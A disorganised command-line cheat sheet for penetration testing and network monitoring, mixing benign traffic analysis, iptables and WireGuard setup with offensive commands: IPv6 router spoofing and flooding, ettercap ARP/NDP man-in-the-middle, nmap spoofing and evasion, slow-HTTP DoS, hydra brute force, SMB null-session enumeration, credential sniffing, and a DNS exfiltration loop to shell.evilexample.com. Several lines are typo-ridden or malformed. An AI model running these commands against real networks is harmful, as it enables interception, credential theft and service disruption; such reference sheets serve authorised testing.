##   [+] Performs reverse DNS enumeration given an IPv6 address.
##-====================================================-##
atk6-dnsrevenum6
atk6-dnsrevenum6 $DNSServer $IPv6Addr/64


##-====================================================-##
##   [+] traceroute that uses ICMP6.
##-====================================================-##
atk6-trace6
atk6-trace6 -d eth0 $TargetIP $Port


##-=======================================================-##
##   [+] Alive6 - Find activities on local network
##-=======================================================-##
## ------------------------------------------------------- ##
##   [?] Detect ICMPv6 echo-reply on global addresses
##   [?] Shows  alive addresses in the segment
## ------------------------------------------------------- ##
atk6-alive6 eth0
atk6-alive6 eth0 -v
atk6-alive6 tun6to4

-V         enable debug output
  -d         DNS resolve alive IPv6 addresses
  -H         print hop count of received packets

-i $File

-Z $Mac     ## Use given destination MAC address



##-=============================================================-##
##   [+] detects new ipv6 addresses joining the local network
##-=============================================================-##
atk6-detect-new-ip6 eth0

##-==========================================-##
##   [+] Announce yourself as a router
##   [+] try to become the default router
##-==========================================-##
atk6-fake_router6 eth0 1::/64
atk6-fake_router6 eth0 1::/64 $MTU $MAC


##-=======================================================-##
##   [+] Dumps all local routers and their information
##-=======================================================-##
atk6-dump_router6 eth0


##-===============================================-##
##   [+] Advertise ipv6 address on the network
##-===============================================-##
## ------------------------------------------------------------------------------ ##
##   [?] sending it to the all-nodes multicast address if no target specified.
## ------------------------------------------------------------------------------ ##
atk6-fake_dhcps6 eth0 1::/64 $DNSServer


##-=======================================================-##
##   [+] Dumps all DHCPv6 servers and their information
##-=======================================================-##
atk6-dump_dhcp6 eth0



##-==========================================-##
##   [+] parasite6 - ARP spoofer for IPv6
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?] redirecting all local traffic to your own  system
##   [?] by answering falsely to Neighbor Solicitation requests
##   [?] specifying FAKE-MAC results in a local DOS.
## ----------------------------------------------------------------- ##
atk6-parasite6 eth0 $FakeMAC
atk6-parasite6 -l eth0



##-==========================================-##
##   [+] frag6 -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
atk6-fragmentation6 -i eth0 --


##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?] Listening for neighbor solitication passively
## ----------------------------------------------------------------- ##
atk6-passive_discovery6 eth0





##-=====================================================-##
##   [+] atk6-smurf6 - ICMPv6 echo replies - Smurf attack
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?] Target of echo request is the local all-nodes multicast address if not specified.
## ----------------------------------------------------------------- ##
atk6-smurf6 eth0 $TargetIP multicast-network-address
atk6-smurf6 eth0 2001::1



##-==========================================-##
##   [+] firewall6 -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
atk6-firewall6 -H eth0 $TargetIP $DstPort



##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
atk6-implementation6 eth0 $TargetIP
atk6-implementation6 eth0 2001::1


##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
script6 get-bruteforce-aaaa $Domain
script6 get-as $IPv6Addr
script6 get-asn $IPv6Addr
cat $File.txt | script6 get-aaaa



##-========================================================-##
##   [+] Obtain the Origin Autonomous System (AS) number 
##       for the IPv6 address 2001:db8::1.
##-========================================================-##
script6 get-asn 2001:db8::1


##-====================================================================-##
##   [+] Obtain information about the Origin Autonomous System (AS) 
##       of the IPv6 address 2001:db8::1.
##-====================================================================-##
script6 get-as 2001:db8::1


##-====================================================================================-##
##   [+] Map the domain names contained in the file "domains.txt" into AAAA records, 
##   [+] save the results in the file "domains-aaaa.txt".
##-====================================================================================-##
cat domains.txt | script6 get-aaaa > domains-aaaa.txt


##-=======================================================================-##
##   [+] Find IPv6 blackholes in the path to each of the IPv6 addresses 
##       contained in the file "domains-aaaa.txt"
##   [+] save the results to the file "trace-results.txt".
##-=======================================================================-##
cat domains-aaaa.txt | script6 trace do8 tcp port 25 > trace-results.txt


##-========================================================================================-##
##   [+] Produce statistics based on the trace results from the file "trace-results.txt" 
##-========================================================================================-##
cat trace-results.txt | script6 get-trace-stats



##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
atk6-flood_router6 eth0


##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
atk6-flood_advertise6


##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
atk6-dos-new-ip6 eth0


##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##



##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
flow6 -i eth0 -v --flow-label-policy -d IPv6ADDR

##-==========================================-##
##   [+]  -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##



##-==========================================-##
##   [+] trace6 - very fast traceroute6
##-==========================================-##
atk6-trace6 eth0 $TargetIP $Port



##-=====================-##
##   [+] kill_router6
##-=====================-##
## ------------------------------------------------------ ##
##   [?] Announce that target router is going down
##   [?] to delete it from the routing tables.
## ------------------------------------------------------ ##
##   [?] If you supply a '*' as target-ip,
##   [?] kill_router6 will sniff the network for RAs
##   [?] and immediately send the kill packet.
## ------------------------------------------------------ ##
atk6-kill_router6 eth0 $TargetIP





## ------------------------------------------------------------------------------ ##
##   [?] find zombie ip in network to use them to scan:
## ------------------------------------------------------------------------------ ##
use auxiliary/scanner/ip/ipidseq
nmap -sI ip target



##-======================================-##
##   [+]
##-======================================-##
nmap --spoof-mac- Cisco --data-length 24 –T paranoid –max-hostgroup
1 – max-parallelism 10 -PN -f –D 10.1.20.5,RND:5,ME --v –n –sS
–sV–oA /desktop/pentest/nmap/out –p T:1-1024
–random-hosts 10.1.1.10 10.1.1.15




##-======================================-##
##   [+] Split in chinks of 10 minutes:
##-======================================-##
editcap -i 600 -A "2013-10-21 13:00:00" -B "2013-10-21 15:00:00" capture.pcapng part.pc


##-==========================================-##
##   [+] Splitting a file into time chunks
##-==========================================-##
editcap -i <secondes per file> <infile> <outfile>




##-======================================-##
##   [+]
##-======================================-##
mergecap $File.pcap $File.pcap $File.pcap -w $File.pcap


pcapfix

pcappick

rawshark

tcpslice

pcapip
tcpreplay




##-======================================-##
##   [+]
##-======================================-##
nast -m -i eth0


##-=================================================-##
##   [+] Read PCAP File - Extract 80 & 443 Packets
##-=================================================-##
tcpflow -c -e -r $File.pcap 'tcp and port (80 or 443)'
tcpflow -r $File.pcap tcp and port \(80 or 443\)


##-================================================-##
##   [+] Record on eth0 - Extract Port 80 Packets
##-================================================-##
tcpflow -p -c -i eth0 port 80


##-================================================-##
##   [+] Capture Port 80 With Snap Length: 96
##-================================================-##
tcpflow -i eth0 -b 96 -e -c port 80


##-================================================-##
##   [+] tcp/ip session reassembler:
##-================================================-##
tcpflow -i eth0 -e -c 'port 25'


##-================================================-##
##   [+] Process PCAP Files in Current Directory
##-================================================-##
tcpflow -o $File -a -l *.pcap


##-===================================================-##
##   [+] Record All Packets Going To & From $Domain
##   [+] Extract All of The HTTP Attachments:
##-===================================================-##
tcpflow -e scan_http -o $Dir host $Domain


##-=================================================================-##
##    [+] record traffic between helios and either hot or ace
##    [+] bin the results into 1000 files per directory
##    [+] calculate the MD5 of each flow:
##-=================================================================-##
tcpflow -X $File.xml -e scan_md5 -o $Dir -Fk host helios and \( hot or ace \)


##-===============================-##
##   [+] Monitor all TCP ports:
##-===============================-##
urlsnarf -i eth0 tcp


##-================================================-##
##   [+] Generate a target list from IP netmask
##-================================================-##
Fping -a -g 192.168.7.0/24




ifpps eth0
ifpps --promisc --dev eth0
ifpps --loop -p --csv -d wlan0 > $File.dat




## ------------------------------ ##
##    [?] Extract PCAP Data:
## ------------------------------ ##
capinfos $File.pcap
tcpslice -r $File.pcap
tcpstat $File.pcap
iftop -i $File.pcap

tcpprof -S lipn -P 30000 -r $File.pcap
tcpflow -r $File.pcap
tcpxtract -f $File.pcap -o $Dir/
tcpick -a -C -r $File.pcap
tcpcapinfo $File.pcap
ngrep -I $File.pcap
nfdump -r $File.pcap
chaosreader -ve $File.pcap
tshark -r $File.pcap
tcpdump -r $File.pcap
tcpreplay -M10 -i eth0 $File.pcap
bro -r $File.pcap
snort -r $File.pcap

capstats
flowscan
netflow
flowgrind
iproute2


flowtop --show-src
nfdump -r /and/dir/nfcapd.201107110845 -c 100 'proto tcp and ( src ip 172.16.17.18 or dst  ip  172.16.17.19  )'
nfdump -r $File 'net 8.8.8.8/32'
nfdump -r $File 'net $IP/$Subnet'




nfdump -R nfcapd.201506230459:nfcapd.201506230634 -a 'src or dst net 49.213.52.133/32'


##-======================================-##
##   [+]
##-======================================-##
ettercap -T -M arp -V [hex,ascii] /x.x.x.x/ /x.x.x.x/
ettercap -T -P repoision_arp -M arp:remote /10.10.102.50/ /10.10.102.5/

ettercap -Tq -M arp:remote -P remote_browser (-P repoison arp) /10.10.102.100/ /10.10.102.4,5/

##-======================================-##
##   [+] Mitm Ipv6 report parasite6

ettercap -Tq -w fichero -M ndp:oneway //fe80:xxxxx? //fe80:xxxxx/

fake_router6 eth0 1::/64

etterfilter filtro.filter -i filtro.ef
ettercap -Tq -F ./filtro.ef -M arp_remote -P repoision_arp /10.10.102.60/ 10/10/10





##-======================================-##
##   [+] Display The Connection Status:
##-======================================-##
tcpick -i eth0 -C


##-================================================-##
##   [+] Display The Payload and Packet Headers:
##-================================================-##
tcpick -i eth0 -C -yP -h -a


##-===============================================================-##
##   [+] Display Client Data Only
##   [+] Just For The First SMTP Connection:
##-===============================================================-##
tcpick -i eth0 -C -bCU -T1 "port 25"
tcpick -r $File.pcap -C -yP -h 'port (25 or 587)'


tcpick -r $File.pcap -C -h -yP -e 15 "port ( 21 or 20 )"

tcpick -r $File.pcap -C -h -wR -e 10 "port 25"

##-====================================-##
##   [+] Download A File Passively:
##-====================================-##
tcpick -i eth0 -wR "port ftp-data"


##-==============================================-##
##   [+] Log HTTP Data in Unique Files
##-==============================================-##
## ---------------------------------------------- ##
##   [?] (client and server mixed together):
## ---------------------------------------------- ##
tcpick -i eth0 "port 80" -wRub


##-========================================-##
##   [+] Pipe The First Connection To NC:
##-========================================-##
tcpick -i eth0 --pipe client "port 80" | gzip > $File.gz
tcpick -i eth0 --pipe server "port 25" | nc $Domain.net 25


tcpick -v5		## Verbose Level 5

tcpick -yP		## Shows data contained in the tcp packets.

tcpick -yX		## Shows all data after the header
				## in hexadecimal and ascii dump with 16 bytes per line.



tcpick -v5 --readfile $File.pcap



##-=====================================-##
##   [+] Analyse packets in real-time
##-=====================================-##
while true ; do tcpick -a -C -r $File.pcap ; sleep 2 ; clear ; done







chaosreader --dir				## Output all files to this directory
chaosreader --verbose			##
chaosreader -ve $File			## Create HTML 2-way & hex files for everything
chaosreader -p $Ports $File		## only ftp and telnet
chaosreader -s 10 				## runs tcpdump for 10 minutes and generates the log file
chaosreader --ipaddr $IP		## Only examine these IPs
chaosreader --filter 'port 7'	## Dump Filter - Port #
chaosreader --port 21,23		## Only examine these ports (TCP & UDP)
chaosreader --preferdns			## Show DNS names instead of IP addresses.
chaosreader --sort type			## Sort Order: type
chaosreader --sort ip			## Sort Order: ip




##-====================================================-##
##   [+]
##-====================================================-##
ngrep -t -x 'USER|PASS|RETR|STOR' tcp port ftp and host server.example.com


##-====================================================-##
##   [+] tcpstat - report network interface statistics
##-====================================================-##
tcpstat -i eth0 -o "Time: %S\tpps: %p\tpacket count: %n\tnet load: %l\tBps: %B\n"


##-====================================================-##
##   [+] ifpps - fetch and format kernel network statistics
##-====================================================-##
ifpps –dev eth0




##-====================================================-##
##   [+] monitor the network for insecure protocols:
##-====================================================-##
dsniff -m [-i interface] [-s snap-length] [filter-expression]


##-==============================================================-##
##   [+] save results in a database, instead of printing them:
##-==============================================================-##
dsniff -w $File.db


##-======================================================-##
##   [+] read and print the results from the database:
##-======================================================-##
dsniff -r $File.db


##-========================================================-##
##   [+] capture mail messages from SMTP or POP traffic:
##-========================================================-##
mailsnarf -i eth0 [-v] [regular-expression [filter-expression]]


##-=================================================-##
##   [+] capture file contents from NFS traffic:
##-=================================================-##
filesnarf -i eth0 [-v] [regular-expression [filter-expression]]


##-=========================================-##
##   [+] capture URLs from HTTP traffic:
##-=========================================-##
urlsnarf -i eth0 [-v] [regular-expression [filter-expression]]




##-==================================================-##
##   [+] search for packets containing data
##       that matches a regular expression and
##       protocols that match a filter expression:
##-==================================================-##
ngrep [grep-options] regular-expression [filter-expression]


##-===============================================-##
##   [+] search for a sequence of binary data:
##-===============================================-##
ngrep -X hexadecimal-digits [filter-expression]


##-===============================================-##
##   [+] sniff packets and save them in a file:
##-===============================================-##
ngrep -O $File [-n count] -d eth0 [-s snap-length] regular-expression [filter-expression]


##-=======================================================-##
##   [+] read and display the saved network trace data:
##-=======================================================-##
ngrep -I $File regular-expression [filter-expression]


##-===============================================-##
##   [+]
##-===============================================-##
ngrep -q -W byline "GET|POST HTTP"


##-===============================================-##
##   [+]
##-===============================================-##
ngrep -d eth0 "www.domain.com" port 443


##-===============================================-##
##   [+]
##-===============================================-##
ngrep -d eth0 "www.domain.com" src host $IP and port 443


##-===============================================-##
##   [+]
##-===============================================-##
ngrep -d eth0 -qt -O $File.pcap "www.domain.com" port 443


##-===============================================-##
##   [+]
##-===============================================-##
ngrep -d eth0 -qt 'HTTP' 'tcp'


##-===============================================-##
##   [+]
##-===============================================-##
ngrep -l -q -d eth0 -i "User-Agent: curl*"





##-======================-##
##   [+] SSH traffic:
##-======================-##
darkstat -i eth0 -f "port 22"
darkstat -i eth0 -f "port 1194"


##-===============================================-##
##   [+]
##-===============================================-##
darkstat --verbose -i eth0 --hexdump --export $File


##-===============================================-##
##   [+]
##-===============================================-##
darkstat -i eth0 -p 80


##-=======================================================-##
##   [+] dont account for traffic between internal IPs:
##-=======================================================-##
darkstat -i eth0 -f "not (src net 192.168.0 and dst net 192.168.0)"


##-=================================================================-##
##   [+] graph all traffic entering and leaving the local network
##-=================================================================-##
darkstat -i eth0 -l 192.168.1.0/255.255.255.0


##-===============================================-##
##   [+]
##-===============================================-##
darkstat --verbose --import $File


##-===============================================-##
##   [+]
##-===============================================-##
darkstat --verbose --export $File





##-=====================================================-##
##   [+] MITM framework - Swiss Army knife for 802.11
##-=====================================================-##
bettercap -iface eth0 -X --proxy -O $File.log

bettercap -iface eth0 -caplet $File.cap






dhcpdump -i wlan0


dumpcap -f "ip host 10.0.0.129"









Test Internet Speed Using Linux Command Line

speedtest-cli --bytes
speedtest-cli --list
speedtest-cli --server server_id

speedometer -r eth0 -t eth0
speedometer -r wlan0 -t wlan0
speedometer -l  -r wlan0 -t wlan0 -m $(( 1024 * 1024 * 3 / 2 ))



sudo nethogs wlan0
sudo nethogs eth0




sudo iptraf



sudo ifstat
sudo ifstat -t -i eth0 0.5



sudo iftop -n

sudo netload eth0



sudo netwatch -e eth0 -nt
sudo trafshow -i eth0 tcp


tcpflow -p -c -i eth0 port 80


tcpdump -vvv -s 0 -l -n port 53  # print DNS outgoing queries
tcpdump -i any -w /tmp/http.log &
killall tcpdump
tcpdump -A -r /tmp/http.log | less


helpful flags (options):

sudo tcpdump -i br0 -n | egrep "91.189.95.54|91.189.95.55"


# Useful to detect DNS amplification
tcpdump -nnni bond0 -c 100 -w sample.txt dst port 53

# which bogus DNS resolvers are sending you an amplified attack.
awk '{print $3}' sample.txt | cut -d '.' -f1-4 | sort | uniq -c | sort -nr



## ---------------------------------------------------------------------------------------------------------------------------- ##


iptables -A INPUT -p tcp -d 192.168.0.12 -m tcp ! --dport 53 -j DROP
iptables -A INPUT -p udp -d 192.168.0.12 -m udp ! --dport 53 -j DROP
iptables -A INPUT -m tcp -p tcp --dport 53 -j ACCEPT


# Block All UDP Ports Through iptable Accept DNS
iptables -A INPUT -p udp --sport 53 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p udp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT

iptables -A INPUT -p udp -j DROP
iptables -A OUTPUT -p udp -j DROP


## ---------------------------------------------------------------------------------------------------------------------------- ##








##-===============================================-##
##   [+]
##-===============================================-##
iftop -i eth0


iftop -i eth0 -f 'port (80 or 443)'
iftop -i eth0 -f 'ip dst 192.168.1.5'


iftop -i eth0 -F 192.168.1.0/255.255.255.0


## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -u | less				## shows CPU usage
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -d						## output disk statistics.
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -b						## I/O and transfer rate statistics
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -n DEV 5 2				## see how much activity came across your network interfaces
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar –u –r –n DEV			## details about the usage of CPU, I/O, memory, and network devices
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -u 2 5					## Report CPU utilization for each 2 seconds. 5 lines are displayed.
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -A						## Display all the statistics saved In current daily data file.
## ---------------------------------------------------------------------------------------------------------------------------- ##



## ---------------------------------------------------------------------------------------------------------------------------- ##
		sar -I 14 -o int14.file 2 10				## Report statistics on IRQ 14 for each 2 seconds.
              												## 10 lines are displayed.
              												## Data is stored  In  a file called int14.file.
## ---------------------------------------------------------------------------------------------------------------------------- ##
		sar -r -n DEV -f /var/log/sysstat/sa16		##  Display memory and network statistics
																		##  saved In daily data file 'sa16'.
## ---------------------------------------------------------------------------------------------------------------------------- ##





Default ncurses output for the eth0 device.
ifpps eth0


Ncurses output for the eth0 device in promiscuous mode.
ifpps -pd eth0

Continuous terminal output for the wlan0 device in promiscuous mode.
ifpps -lpcd wlan0 > plot.dat











The superblock 			contains information about the filesystem as a whole,
						such as its size (the exact information here depends on the filesystem).

inode 					contains all information about a file, except its name.
						The name is stored In the directory, together with the number of the inode.

Directory entry 		consists of a filename and the number of the inode which represents the file.
						The inode contains the numbers of several data blocks, which are used to store
						the data In the file. There is space only for a few data block numbers In the inode,

indirect blocks			These dynamically allocated blocks - used as backup for pointers to the data blocks





URLs

--proxy					##


httrack $Domain/$File.html --spider -P proxy.myhost.com:8080

httrack $Domain/$File.html --spider -P 10.8.0.1:1080
httrack $Domain/$File.html --spider -P 10.64.0.1:1080



--spider URLs					##


--stay-on-same-dir					##
--can-go-up					##
--can-go-down					##


--can-go-up-and-down				## -B     can both go up&down into the directory structure




--stay-on-same-domain					##
--stay-on-same-address					##



--stay-on-same-tld					## -l     stay on the same TLD








--user-agent					##
--referer					##



--headers					##

--debug-headers					##






--catch-url						-#P    catch URL


-*p3   ## save all files






--urllist					##
--mirror $URLs					##
--mirrorlinks URLs 					##
--list					##
--keep-links					##



--cookies					##


--verbose						## -v     log on screen



--single-log			## -f2    one single log file
--file-log				## -f     *log in files
--debug-log				##
--extra-log				## -z     log - extra infos

--clean					##




--debug-xfrstats				## -#T    generate transfer ops. log every minutes
--debug-ratestats				## -#Z    generate transfer rate statictics every minutes

--debug-parsing					## -#d    debug parser

--debug-cache					## -#C    cache list

								## -#C  *.com/spider*.gif







--go-everywhere						##

--generate-errors					##

























##-=================-##
##   [+] httpie
##-=================-##



## --------------------------------------------- ##
##   [?] print request and response headers
##   [?] request headers + response headers
## --------------------------------------------- ##
http -p Hh $Domain


## --------------------------------------------- ##
##   [?] print request and response headers
##   [?] request headers + response headers
##   [?] follow redirects
##   [?] skip SSL verification
## --------------------------------------------- ##
http -p Hh $Domain --follow --verify no


## --------------------------------------------- ##
##   [?] Use Proxy for connection
## --------------------------------------------- ##
http -p Hh $Domain --follow --verify no --proxy http:http://127.0.0.1:16379




##-========================================================================================-##
##   [+] SlowHTTPTest - application layer Denial of Service attacks simulation tool
##-========================================================================================-##
## --------------------------------------------- ##
 - Slow HTTP POST
 - Slow Read attack
     [?] based on TCP persist timer exploit
     [?] by draining concurrent connections pool
 - Apache Range Header attack
## --------------------------------------------- ##
slowhttptest -c 1000 -g -X -o slow_read_stats -r  200 -w 512 -y 1-25 -m 5 -z 32 -k 3 -u http://10.10.102.X -p 3






##-=================================-##
##   [+] Start required services:
##-=================================-##
systemctl start rpcbind

##-================================================-##
##   [+] Show file system exports on the client:
##-================================================-##
showmount -e $IP


##-======================================-##
##   [+] Mount a network file system:
##-======================================-##
mount nfs




##-==========================-##
##   [+] Find NFS Port
##-==========================-##
nmap -p 111 --script=rpcinfo.nse -vv -oN nfs_port; $IP


##-==========================-##
##   [+] Services Running
##-==========================-##
rpcinfo –p; $IP
rpcbind -p rpcinfo –p x.x.x.x



rpcinfo -p | egrep -w "port|81[14]"



##-===================================-##
##   [+] Show Mountable NFS Shares
##-===================================-##
nmap --script=nfs-showmount -oN mountable_shares; $IP; showmount -e; $IP



##-===========================================-##
##   [+]
##-===========================================-##
rpcinfo -p | egrep -w "port|81[14]"





##-================================================-##
##   [+] RPC Enumeration (Remote Procedure Call)
##-================================================-##


##-======================================================-##
##   [+] Connect to an RPC share without a
##      username and password and enumerate privileges
##-======================================================-##
rpcclient --user="" --command=enumprivs -N $IP


##-===========================================-##
##  [+] Connect to an RPC share with a
##      username and enumerate privileges
##-===========================================-##
rpcclient --user="" --command=enumprivs $IP




mount -t nfs $IP:/var/myshare /mnt/shareddrive
mount -t nfs $IP:/mountlocation /mnt/mountlocation

serverip:/mountlocation /mnt/mountlocation nfs defaults 0 0


nmap -sV --script=nfs-showmount $IP




##-========================-##
##   [+] SMB + NETBIOS
##-========================-##



##-======================-##
##  [+] Over All scan
##-======================-##
enum4linux -a $IP

##-============================================-##
##   [+] Enumerate using SMB (w/user & pass)
##-============================================-##
enum4linux -a -u <user> -p <passwd> $IP


##-=============================-##
##  [+] Enum4linux bash-loop:
##-=============================-##
for targets in $(cat $File.txt); do enum4linux $targets; done



##-=============================-##
##  [+]
##-=============================-##
enum4linux -a -v -M -l -d $1



##-============================================-##
##   [+] Guest User and null authentication
##-============================================-##
smbmap -u anonymous -p anonymous -H 10.10.10.172
smbmap -u '' -p '' -H 10.10.10.172

smbmap -H [ip] -d [domain] -u [user] -p [password]   -r --depth 5 -R


##-==============================-##
##  [+] Vulnerability Scanning
##-==============================-##
nmap --script="+\*smb\* and not brute and not dos and not fuzzer" -p 139,445 -oN smb-vuln; $IP


##-===========================-##
##  [+] Enumerate Hostnames
##-==========================-##
nmblookup -A $IP


##-====================================================-##
##   [+] List Shares with no creds and guest account
##-====================================================-##
smbmap -H \[$IP/hostname\] -u anonymous -p hokusbokus -R
nmap --script smb-enum-shares -p 139,445 $IP


##-==============================-##
##  [+] List Shares with creds
##-==============================-##
smbmap -H \[$IP\] -d \[domain\] -u \[user\] -p \[password\] -r --depth 5 -R


##-===========================-##
##   [+] Connect to share
##-===========================-##
smbclient \\\\[$IP\]\\\[share name\]


##-=======================================-##
##   [+] Netbios Information Scanning
##-=======================================-##
nbtscan -r $IP/24


##-===========================================-##
##   [+] Find Service Provided By Machines:
##-===========================================-##
nbtscan -hv $IP/24


##-===========================================-##
##   [+] Nmap find exposed Netbios servers
##-===========================================-##
nmap -sU --script nbstat.nse -p 137 $IP


##-=========================-##
##   [+] Mount smb share:
##-=========================-##
mount -t cifs //server ip/share/dir/; -o username=”guest”,password=””



##-============================================-##
##   [+] SMB Enumeration Technique - NBTSCAN
##-============================================-##


##-=======================================================-##
##   [+] NBT name scan for addresses from 10.0.2.0/24
##-=======================================================-##
nbtscan -r 10.0.2.0/24



mount -o port=2049,mountport=44096,proto=tcp 127.0.0.1:/home /home
nfs-showmount.nse script,
auxiliary/scanner/snmp/snmp_enum


## -------------------------------------------------------------------- ##
##   [?] discover available Windows shared drives or for NFS shares.
## -------------------------------------------------------------------- ##
net view \\<remote system>
showmount -e



snmpset











nmap -n -Pn -sV $IP -p $PORT --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN $OUTPUT/ftp_$IP-$PORT.nmap


hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -f -o $OUTPUT/ftp
hydra_$IP-$PORT -u $IP -s $PORT ftp




## -------------------------------------------------------------------------------------------- ##
##   [?] Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists
## -------------------------------------------------------------------------------------------- ##
nmap --script dns-blacklist --script-args='dns-blacklist.ip=<ip>'


##-===========================-##
##   [+] dns-zone-transfer:
##-===========================-##
## ---------------------------------------------------------------- ##
##   [?] Attempts to pull a zone file (AXFR) from a DNS server.
## ---------------------------------------------------------------- ##
nmap --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=<domain> -p53 <hosts>





nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80
nmap --script dns-brute www.foo.com



nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={host1,host2,host3}' <target>




nmap -sn -Pn ns1.example.com --script dns-check-zone --script-args='dns-check-zone.domain=example.com'










##-===============================-##
##   [+] Firewall/IDS evasion
##-===============================-##


-f                  ## fragment packets
-S $IP              ## spoof source address
--randomize-hosts
-D d1,d2	    	## cloak scan with decoys
--source-port $SrcPort         ## spoof source port
--spoof-mac $MAC    ## change the src mac



nmap -S $SourceIP
nmap –g $SourcePort
nmap -D d1,d2
nmap --randomize-hosts

nmap --spoof-mac $MacAddr






##-===============================-##
##   [+] Capture TCP stream
##-===============================-##


##-===========================================-##
##   [+] Step1 (capture network trafic):
##-===========================================-##
tshark -i eth0 -f "port 9088" -w $File.pcap


##-===========================================-##
##   [+] Step2 (list captured tcp streams):
##-===========================================-##
tshark -r $File.pcap -T fields -e tcp.stream | sort -u


##-==============================================================-##
##   [+] Step3 (dump the content of one particular tcp stream):
##-==============================================================-##
tshark -nr $File.pcap -q -d tcp.port==9088,http -z follow,http,ascii,_your_stream_number




##-====================================-##
##   [+] DNS domain name resolutions
##-====================================-##
tshark -r HTTPS_traffic.pcap -Y "dns && dns.flags.response==0" -Tfields -e ip.dst


##-===================================================-##
##  [+] CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
##-===================================================-##
tcpdump -i ethO -c 50 -tttt 'udp and port 53'



echo "##-=================================================-##"
echo " 	  [+] Read In each line and do a D~S lookup			 "
echo "##-=================================================-##"
for b In `cat fole.hex `; do dig $b.shell.evilexample.com; done


echo "##-==================================-##"
echo " 	  [+] Capture DNS Exfil Packets		"
echo "##-==================================-##"
tcdpump -w /tmp/dns -sO port 53 and host sjstem.example.com


echo "##-=================================================-##"
echo " 	  [+] Cut the exfil!ed hex from t~e DNS packet		"
echo "##-=================================================-##"
tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d | cut -fl -d'.' | uniq received. txt




##-===========================================-##
##   [+]
##-===========================================-##
tcpdump -w $File.pcap tcp port ftp or ftp-data and host $Domain


##-===========================================-##
##   [+] PRINT ALL PING RESPONSES
##-===========================================-##
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'


##-===========================================-##
##   [+] SHOW CONNECTIONS TO A SPECIFIC IP
##-===========================================-##
tcpdump -i ethO -tttt dst $DstIP and not net 192.168.1.0/24









##-==============================-##
##   [+] Generate Certificates:
##-==============================-##


##-========================================-##
##   [+] Generate a public and private
##   [+] certificate on the server:
##-========================================-##
umask 077
wg genkey | tee server_private_key | wg pubkey > server_public_key


Enable IPv4 Forwarding
## Enable IPv4 forwarding so that we can access the rest of the LAN and not just the server itself.
## Open /etc/sysctl.conf and comment out the following line

net.ipv4.ip_forward=1

## Step 5: Restart the server, or use the following commands for the IP forwarding to take effect without restarting the server


sysctl -p
echo 1 > /proc/sys/net/ipv4/ip_forward




## Start WireGuard:


##   [+] Start WireGuard on the Server


enable WireGuard to start automatically
when the server starts.

chown -v root:root /etc/wireguard/wg0.conf
chmod -v 600 /etc/wireguard/wg0.conf
wg-quick up wg0
systemctl enable wg-quick@wg0.service




Generate Certificates
## Generate a public and private certificate on the client

wg genkey | tee client_private_key | wg pubkey > client_public_key








##-=======================================-##
##   [+] Run our configuration script
##-=======================================-##
curl -LO https://mullvad.net/media/files/mullvad-wg.sh && chmod +x ./mullvad-wg.sh && ./mullvad-wg.sh

##-================================================================-##
##   [+] Set the correct permissions so only root can read them:
##-================================================================-##
sudo chown root:root -R /etc/wireguard && sudo chmod 600 -R /etc/wireguard

##-===============================================-##
##   [+] start WireGuard automatically on boot
##-===============================================-##
systemctl enable wg-quick@mullvad-se4

##-=============================-##
##   [+] Turn on WireGuard
##-=============================-##
wg-quick up mullvad-se4

##-=============================-##
##   [+] Turn off WireGuard
##-=============================-##
wg-quick down mullvad-se4





useradd --home /etc/openvpn --user-group --shell /bin/false tunnel

if [ -d /run/systemd/system ] ; then
   systemd-tmpfiles --create /usr/lib/tmpfiles.d/50_openvpn-unpriv.conf >/dev/null || true
   systemctl --system daemon-reload >/dev/null || true
fi



openVPN running on a non­stanard port

semanage port -a -t openvpn_port_t -p udp 1195









recon-ng
keys list
##-========================================================-##
##   [+] start by adding twitter_api and twitter_secret
##-========================================================-##

Log in to Twitter, go to

https://apps.twitter.com/

Click on Create Application;
once the application is created,
navigate to the
Keys and Access Tokens tab
and copy the secret key and API key


Keys add twitter_api <your-copied-api-key>

